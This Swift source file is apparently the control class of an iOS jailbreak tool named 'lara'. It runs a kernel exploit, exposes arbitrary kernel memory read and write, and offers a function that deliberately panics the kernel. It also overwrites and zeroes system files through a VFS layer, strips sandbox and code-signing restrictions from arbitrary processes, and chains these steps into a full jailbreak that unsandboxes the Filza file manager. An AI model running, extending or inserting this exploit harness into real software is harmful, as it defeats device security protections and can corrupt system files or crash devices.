//
//  laramgr.swift
//  lara
//
//  Created by ruter on 23.03.26.
//

import Combine
import Foundation
import notify

final class laramgr: ObservableObject {
    @Published var log: String = ""
    @Published var dsrunning: Bool = false
    @Published var dsready: Bool = false
    @Published var dsattempted: Bool = false
    @Published var dsfailed: Bool = false
    @Published var dsprogress: Double = 0.0
    @Published var kernbase: UInt64 = 0
    @Published var kernslide: UInt64 = 0
    
    @Published var kaccessready: Bool = false
    @Published var kaccesserror: String?
    @Published var fileopinprogress: Bool = false
    @Published var testresult: String?
    
    @Published var vfsready: Bool = false
    @Published var vfsinitlog: String = ""
    @Published var vfsattempted: Bool = false
    @Published var vfsfailed: Bool = false
    @Published var vfsrunning: Bool = false
    @Published var vfsprogress: Double = 0.0
    
    static let shared = laramgr()
    static let fontpath = "/System/Library/Fonts/Core/SFUI.ttf"
    private init() {}
    
    func run(completion: ((Bool) -> Void)? = nil) {
        guard !dsrunning else { return }
        dsrunning = true
        dsready = false
        dsfailed = false
        dsattempted = true
        dsprogress = 0.0
        log = ""

        ds_set_log_callback { messageCStr in
            guard let messageCStr else { return }
            let message = String(cString: messageCStr)
            DispatchQueue.main.async {
                laramgr.shared.logmsg("(ds) \(message)")
            }
        }
        ds_set_progress_callback { progress in
            DispatchQueue.main.async {
                laramgr.shared.dsprogress = progress
            }
        }

        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let result = ds_run()

            DispatchQueue.main.async {
                guard let self else { return }
                self.dsrunning = false
                let success = result == 0 && ds_is_ready()
                if success {
                    self.dsready = true
                    self.dsfailed = false
                    self.kernbase = ds_get_kernel_base()
                    self.kernslide = ds_get_kernel_slide()
                    self.logmsg("\nexploit success!")
                    self.logmsg(String(format: "kernel_base:  0x%llx", self.kernbase))
                    self.logmsg(String(format: "kernel_slide: 0x%llx\n", self.kernslide))
                    globallogger.log("exploit success!")
                    globallogger.log(String(format: "kernel_base:  0x%llx", self.kernbase))
                    globallogger.log(String(format: "kernel_slide: 0x%llx", self.kernslide))
                    globallogger.divider()
                } else {
                    self.dsfailed = true
                    self.logmsg("\nexploit failed.\n")
                    globallogger.log("exploit failed.")
                    globallogger.divider()
                }
                self.dsprogress = 1.0
                completion?(success)
            }
        }
    }
    
    func logmsg(_ message: String) {
        DispatchQueue.main.async {
            self.log += message + "\n"
            globallogger.log(message)
        }
    }

    func kread64(address: UInt64) -> UInt64 {
        guard dsready else { return 0 }
        return ds_kread64(address)
    }

    func kwrite64(address: UInt64, value: UInt64) {
        guard dsready else { return }
        ds_kwrite64(address, value)
    }

    func kread32(address: UInt64) -> UInt32 {
        guard dsready else { return 0 }
        return ds_kread32(address)
    }

    func kwrite32(address: UInt64, value: UInt32) {
        guard dsready else { return }
        ds_kwrite32(address, value)
    }
    
    func panic() {
        guard dsready else { return }
        
        globallogger.log("triggering panic")
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            let kernbase = ds_get_kernel_base()
            globallogger.log("writing to read-only memory at kernel base")
            ds_kwrite64(kernbase, 0xDEADBEEF)
        }
    }
    
    func respring() {
        notify_post("com.apple.springboard.toggleLockScreen")
    }
    
    func vfsinit(completion: ((Bool) -> Void)? = nil) {
        vfs_setlogcallback(laramgr.vfslogcallback)
        vfs_setprogresscallback { progress in
            DispatchQueue.main.async {
                laramgr.shared.vfsprogress = progress
            }
        }
        vfsattempted = true
        vfsfailed = false
        vfsrunning = true
        vfsprogress = 0.0
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            let r = vfs_init()
            DispatchQueue.main.async {
                guard let self = self else { return }
                self.vfsready = (r == 0 && vfs_isready())
                if self.vfsready {
                    self.vfsfailed = false
                    self.logmsg("\nvfs ready!\n")
                } else {
                    self.vfsfailed = true
                    self.logmsg("\nvfs init failed.\n")
                }
                self.vfsrunning = false
                self.vfsprogress = 1.0
                completion?(self.vfsready)
            }
        }
    }

    private static let vfslogcallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { msg in
        guard let msg = msg else { return }
        let s = String(cString: msg)
        DispatchQueue.main.async {
            laramgr.shared.vfsinitlog += "(vfs) " + s + "\n"
            laramgr.shared.logmsg("(vfs) " + s)
        }
    }

    func vfslistdir(path: String) -> [(name: String, isDir: Bool)]? {
        guard vfsready else {
            logmsg(" listdir: not ready (\(path))")
            return nil
        }
        var ptr: UnsafeMutablePointer<vfs_entry_t>?
        var count: Int32 = 0
        let r = vfs_listdir(path, &ptr, &count)
        guard r == 0, let entries = ptr else {
            logmsg(" listdir failed (\(path)) r=\(r)")
            return nil
        }
        defer { vfs_freelisting(entries) }

        var items: [(String, Bool)] = []
        for i in 0..<Int(count) {
            let e = entries[i]
            let name = withUnsafePointer(to: e.name) { p in
                p.withMemoryRebound(to: CChar.self, capacity: 256) { String(cString: $0) }
            }
            items.append((name, e.d_type == 4))
        }
        logmsg(" listdir \(path) -> \(items.count)")
        return items.sorted { $0.0.lowercased() < $1.0.lowercased() }
    }

    func vfsread(path: String, maxSize: Int = 512 * 1024) -> Data? {
        guard vfsready else { return nil }
        let fsz = vfs_filesize(path)
        if fsz <= 0 { return nil }
        let toRead = min(Int(fsz), maxSize)
        var buf = [UInt8](repeating: 0, count: toRead)
        let n = vfs_read(path, &buf, toRead, 0)
        if n <= 0 { return nil }
        return Data(buf.prefix(Int(n)))
    }

    func vfswrite(path: String, data: Data) -> Bool {
        guard vfsready else { return false }
        return data.withUnsafeBytes { ptr in
            let n = vfs_write(path, ptr.baseAddress, data.count, 0)
            return n > 0
        }
    }

    func vfssize(path: String) -> Int64 {
        guard vfsready else { return -1 }
        return vfs_filesize(path)
    }

    func vfsoverwritefromlocalpath(target: String, source: String) -> Bool {
        print("(vfs) target \(source) -> \(target)")

        guard vfsready else {
            print("(vfs) not ready")
            return false
        }

        guard FileManager.default.fileExists(atPath: source) else {
            print("(vfs) source file not found: \(source)")
            return false
        }

        let r = vfs_overwritefile(target, source)

        print("(vfs) vfs_overwritefile returned: \(r)")

        if r == 0 {
            print("(vfs) file overwritten")
        } else {
            print("(vfs) failed to overwrite file")
        }

        return r == 0
    }

    func vfsoverwritewithdata(target: String, data: Data) -> Bool {
        guard vfsready else { return false }
        let tmp = NSTemporaryDirectory() + "vfs_src_\(arc4random()).bin"
        do { try data.write(to: URL(fileURLWithPath: tmp)) } catch { return false }
        let ok = vfsoverwritefromlocalpath(target: target, source: tmp)
        try? FileManager.default.removeItem(atPath: tmp)
        return ok
    }
    
    func vfszeropage(at path: String) -> Bool {
        let result = path.withCString { cpath in
            vfs_zeropage(cpath, 0)
        }

        if result != 0 {
            self.logmsg("(vfs) zeropage failed")
            return false
        }

        self.logmsg("(vfs) zeroed first page of \(path)")
        return true
    }
    
    // === SANDBOX BYPASS + FILZA LAUNCH ===
    
    @Published var sandboxBypassed: Bool = false
    @Published var filzaLaunched: Bool = false
    
    func sandboxBypass(pid: pid_t? = nil) -> Bool {
        guard dsready else {
            logmsg("(sandbox) exploit not ready")
            return false
        }
        
        let targetPid = pid ?? getpid()
        logmsg("(sandbox) bypassing sandbox for pid \(targetPid)...")
        
        // Method 1: Null out p_sandbox
        let sandboxResult = sandbox_bypass_pid(targetPid)
        if sandboxResult == 0 {
            logmsg("(sandbox) p_sandbox bypass SUCCESS")
        } else {
            logmsg("(sandbox) p_sandbox bypass failed, trying csflags...")
        }
        
        // Method 2: Patch csflags
        let csflagsResult = csflags_bypass_pid(targetPid)
        if csflagsResult == 0 {
            logmsg("(sandbox) csflags bypass SUCCESS")
        } else {
            logmsg("(sandbox) csflags bypass failed")
        }
        
        let success = (sandboxResult == 0 || csflagsResult == 0)
        if success {
            self.sandboxBypassed = true
            logmsg("(sandbox) bypass complete for pid \(targetPid)")
        } else {
            logmsg("(sandbox) bypass FAILED")
        }
        
        return success
    }
    
    func launchFilza() -> Bool {
        logmsg("(filza) launching Filza File Manager...")
        
        guard let url = URL(string: "filza://") else {
            logmsg("(filza) failed to create filza:// URL")
            return false
        }
        
        // Try LSApplicationWorkspace openURL:
        if let wsClass = NSClassFromString("LSApplicationWorkspace") {
            let ws = (wsClass as AnyObject).value(forKey: "defaultWorkspace")
                ?? (wsClass as AnyObject).value(forKey: "sharedWorkspace")
            
            if let ws = ws as? NSObject {
                let openSel = NSSelectorFromString("openURL:")
                if ws.responds(to: openSel) {
                    _ = ws.perform(openSel, with: url)
                    logmsg("(filza) openURL: called on LSApplicationWorkspace")
                    self.filzaLaunched = true
                    
                    // Wait for Filza to launch, then patch its sandbox
                    DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 2.0) { [weak self] in
                        guard let self = self else { return }
                        self.patchFilzaSandbox()
                    }
                    
                    return true
                }
            }
        }
        
        // Fallback: try UIApplication openURL:
        if let appClass = NSClassFromString("UIApplication") {
            if let shared = (appClass as AnyObject).value(forKey: "sharedApplication") as? NSObject {
                let openSel = NSSelectorFromString("openURL:")
                if shared.responds(to: openSel) {
                    _ = shared.perform(openSel, with: url)
                    logmsg("(filza) openURL: called on UIApplication")
                    self.filzaLaunched = true
                    
                    DispatchQueue.global(qos: .userInitiated).asyncAfter(deadline: .now() + 2.0) { [weak self] in
                        guard let self = self else { return }
                        self.patchFilzaSandbox()
                    }
                    
                    return true
                }
            }
        }
        
        logmsg("(filza) all launch methods failed")
        return false
    }
    
    private func patchFilzaSandbox() {
        logmsg("(filza) searching for Filza process...")
        
        let filzaNames = ["Filza", "com.tigisoftware.Filza"]
        
        for name in filzaNames {
            let sbResult = name.withCString { sandbox_bypass_pid_by_name($0) }
            let csResult = name.withCString { csflags_bypass_pid_by_name($0) }
            
            if sbResult == 0 || csResult == 0 {
                logmsg("(filza) sandbox bypass SUCCESS for \(name)")
                return
            }
        }
        
        // Fallback: retry a few times with delay
        for attempt in 1...5 {
            Thread.sleep(forTimeInterval: 1.0)
            for name in filzaNames {
                let sbResult = name.withCString { sandbox_bypass_pid_by_name($0) }
                if sbResult == 0 {
                    logmsg("(filza) sandbox bypass SUCCESS for \(name) (attempt \(attempt))")
                    return
                }
            }
        }
        
        logmsg("(filza) could not find Filza process after retries")
    }
    
    func fullJailbreakFlow(completion: ((Bool) -> Void)? = nil) {
        // Step 1: Run exploit
        run { exploitSuccess in
            guard exploitSuccess else {
                completion?(false)
                return
            }
            
            // Step 2: Init VFS
            self.vfsinit { vfsSuccess in
                guard vfsSuccess else {
                    completion?(false)
                    return
                }
                
                // Step 3: Sandbox bypass
                let sandboxOk = self.sandboxBypass()
                guard sandboxOk else {
                    completion?(false)
                    return
                }
                
                // Step 4: Launch Filza
                let filzaOk = self.launchFilza()
                completion?(filzaOk)
            }
        }
    }
}
